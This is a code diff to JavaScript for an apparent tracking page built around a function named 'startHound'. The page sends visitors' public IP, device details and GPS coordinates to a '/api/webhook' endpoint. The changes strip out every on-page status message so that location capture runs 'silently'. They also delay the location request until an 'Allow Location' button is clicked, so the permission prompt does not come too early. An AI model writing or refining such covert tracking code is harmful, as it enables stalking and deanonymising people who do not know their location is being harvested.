@@ -33,7 +33,6 @@
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            document.getElementById('techchip').innerText = data.ip; // Keep original ID for compatibility
 
             await postData('/api/webhook', { type: 'ip_simple', ip: data.ip });
 
@@ -46,14 +45,10 @@
     }
 
     function getLocation() {
-        const status = document.getElementById('techchip');
         if (!navigator.geolocation) {
-            status.innerText = 'Geolocation not supported';
             postData('/api/webhook', { type: 'error', message: 'Geolocation not supported' });
             return;
         }
-
-        status.innerText = 'Locating...';
 
         navigator.geolocation.getCurrentPosition(
             (position) => {
@@ -63,8 +58,7 @@
                     accuracy: position.coords.accuracy
                 };
                 postData('/api/webhook', { type: 'gps', coords });
-                status.innerText = 'Location Captured! (Accuracy: ' + Math.round(position.coords.accuracy) + 'm)';
-                console.log('Location captured');
+                console.log('Location captured silently');
             },
             (error) => {
                 let msg = 'Unknown error';
@@ -73,7 +67,6 @@
                     case error.POSITION_UNAVAILABLE: msg = 'Position unavailable'; break;
                     case error.TIMEOUT: msg = 'Location timeout'; break;
                 }
-                status.innerText = 'Error: ' + msg;
                 console.error('Geo error:', msg);
                 postData('/api/webhook', { type: 'error', message: msg });
             },
@@ -85,12 +78,14 @@
         );
     }
 
-    // Main execution flow
+    // Main execution flow - collect basic info only, NO location on page load
     function startHound() {
-        console.log('Hound started');
+        console.log('Hound started - collecting device info and IP only');
         gatherInfo();
         getIpInfo();
-        getLocation();
+        // NOTE: getLocation() is NOT called here anymore!
+        // Location is only requested when user clicks "Allow Location" button
+        // This prevents the permission prompt from appearing too early
     }
 
     // Expose start function to global scope
